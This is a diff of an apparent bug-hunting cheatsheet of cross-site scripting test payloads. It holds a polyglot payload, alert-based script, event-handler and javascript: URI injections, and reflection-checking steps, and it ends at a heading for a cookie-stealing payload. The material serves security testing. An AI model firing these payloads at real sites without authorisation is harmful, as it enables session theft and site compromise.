@@ -1,5 +1,5 @@
 # Testing XSS
-**One Payload For Testing All Kinds of XSS**
+**One Payload For Testing All Kinds of scenario**
 ```
 JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
 <!--</Title/<​/Style/<​/Script/</textArea/</iFrame>
@@ -16,6 +16,8 @@ JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
   1. Check html tag and attribute for reflection.
   2. If < and > symbol reflecting in source code without encoding, XSS possible.
   3. If ' or " symbol reflecting in source code without encoding, XSS possible.
+
+**Testing XSS in every type of scenario**
 ```js
 <script>alert(1337)</script>
 ><script>alert(1337)</script>
@@ -33,6 +35,10 @@ ${alert(1337)}
 /?'accesskey='x'onclick='alert(1337)
 javascript:alert(1337) (Inject in href attribute)
 y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1337)%3E
+"><h1>cyborg.71</h1>
+<script onclick="alert(1337)">
+<a href="javascript:alert('XSS')">Click me</a>
+<img src=https://i.imgflip.com/8uo0t9.jpg>
 ```
 Here, ```%09``` represents the horizontal tab character and ```%0A``` represents the newline.
 <br>
@@ -46,14 +52,6 @@ Here, ```%09``` represents the horizontal tab character and ```%0A``` represents
 ![Screenshot from 2024-06-22 21-36-45](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/06045884-2e15-4998-bfe6-057cf34dbe92)
 
 ![Screenshot from 2024-06-22 21-38-04](https://github.com/cyb0rg71/Bug-Hunting-Cheatsheet/assets/118939850/925458b2-619b-4545-a675-81ee043cd00c)
-
-**For testing**
-```js
-"><h1>cyborg.71</h1>
-<script onclick="alert(1337)">
-<a href="javascript:alert('XSS')">Click me</a>
-<img src=https://i.imgflip.com/8uo0t9.jpg>
-```
 ## Payload for stealing cookies
 ```js
 <script>
